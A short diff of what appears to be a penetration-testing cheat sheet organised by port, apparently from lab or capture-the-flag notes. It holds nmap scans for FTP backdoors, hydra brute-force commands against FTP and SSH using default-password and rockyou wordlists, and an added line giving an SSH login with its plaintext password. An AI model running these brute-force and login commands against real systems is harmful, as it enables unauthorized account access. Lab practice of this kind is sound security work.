@@ -30,7 +30,8 @@ nmap -p 21 --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoo
 hydra -C $ftpbetterdefaultpasslist 192.168.200.5 ftp
 
 # 22 SSH
-hydra -f -V -I -t 50 -l bob -P $rockyou 192.168.200.5 ssh -s 22022
+ssh founduser@192.168.141.60  (pw: founduser)
+hydra -f -V -I -t 50 -l founduser -P $rockyou 192.168.200.5 ssh -s 22022
 
 # 25 SMTP
 nmap -pT:25 -v --script smtp-commands.nse 192.168.200.5
